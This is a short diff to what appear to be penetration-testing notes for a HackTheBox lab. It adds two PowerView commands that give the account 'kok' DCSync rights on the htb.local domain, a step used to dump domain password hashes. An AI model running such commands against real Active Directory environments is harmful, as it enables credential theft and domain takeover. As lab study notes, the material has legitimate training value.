@@ -137,6 +137,9 @@ bloodhound
 ```powershell
 Add-DomainObjectAcl -PrincipalIdentity <CN> -Credential $Cred -Rights <String>
 Add-DomainObjectAcl -PrincipalIdentity <CN> -Credential $Cred -RightsGUID <Guid>
+
+Add-DomainObjectAcl -PrincipalIdentity 'kok' -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -Verbose
+Add-ObjectAcl -PrincipalIdentity 'kok' -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Rights DCSync -Verbose
 ```
 
 
